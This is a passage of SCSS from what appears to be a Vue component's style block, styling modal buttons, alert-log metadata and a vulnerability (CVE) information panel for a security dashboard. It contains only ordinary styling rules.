  color: var(--muted-foreground, #7c8a9e);
}

.modal-btn {
  padding: 5px 14px;
  font-size: 12px;
  font-weight: 600;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s ease;
  border: none;

  &--copy {
    background: transparent;
    border: 1px solid rgba(49, 171, 227, 0.12);
    color: #31ABE3;
    &:hover { background: rgba(49, 171, 227, 0.1); }
  }

  &--close {
    background: #31ABE3;
    color: #fff;
    &:hover { background: #00fdfa; color: #000; }
  }
}

/* 详情弹窗内 */
.detail-summary {
  display: flex;
  flex-wrap: wrap;
  gap: 10px 24px;
  padding: 10px 14px;
  background: #f8fafc;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  margin-bottom: 14px;

  .detail-summary-item {
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    gap: 6px;
    font-size: 12px;

    .label {
      color: var(--muted-foreground, #7c8a9e);
      font-weight: 500;
      white-space: nowrap;
    }
  }
}

.dl-header {
  background: #f8fafc;
  color: var(--muted-foreground, #7c8a9e);
  border-bottom: 1px solid #e5e7eb;
  border-radius: 6px 6px 0 0;
}

.dl-row {
  border-bottom: 1px solid rgba(229, 231, 235, 0.5);
  &:hover { background: rgba(49, 171, 227, 0.03); }
  &:last-child { border-bottom: none; }
}

/* 告警日志元信息 */
.log-meta {
  display: flex;
  flex-direction: column;
  gap: 4px;
  padding: 10px 14px;
  background: #f8fafc;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  margin-bottom: 12px;

  .log-meta-item {
    font-size: 12px;
    color: #374151;
    word-break: break-all;

    .label {
      display: inline-block;
      min-width: 64px;
      color: var(--muted-foreground, #7c8a9e);
      font-weight: 500;
    }
  }
}

/* 漏洞简要信息 */
.cve-info {
  display: flex;
  flex-direction: column;
  gap: 12px;

  .cve-head {
    display: flex;
    align-items: center;
    gap: 10px;

    .cve-id {
      font-size: 18px;
      font-weight: 700;
      font-family: ui-monospace, monospace;
      color: #1f2937;
    }

    .cve-sev {
      padding: 2px 10px;
      font-size: 11px;
      font-weight: 700;
      border-radius: 999px;
    }
  }

  .cve-row {
    font-size: 12.5px;
    color: #374151;
    line-height: 1.6;
    word-break: break-word;

    .label {
      display: inline-block;
      min-width: 64px;
      color: var(--muted-foreground, #7c8a9e);
      font-weight: 500;
      margin-right: 4px;
    }

    &.cve-desc {
      padding: 10px 12px;
      background: #f8fafc;
      border-radius: 8px;
      border-left: 3px solid #31ABE3;
    }

    .cve-link {
      color: #31ABE3;
      text-decoration: underline;
      word-break: break-all;
    }
  }
}

.hq-btn-query {
  background: rgba(49, 171, 227, 0.1);
  border: 1px solid rgba(49, 171, 227, 0.12);
  color: #31ABE3;
  padding: 5px 16px;
  font-size: 12px;
  font-weight: 600;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s ease;
  white-space: nowrap;
  &:hover:not(:disabled) { background: rgba(49, 171, 227, 0.18); }
  &:disabled { opacity: 0.5; cursor: not-allowed; }
}
</style>
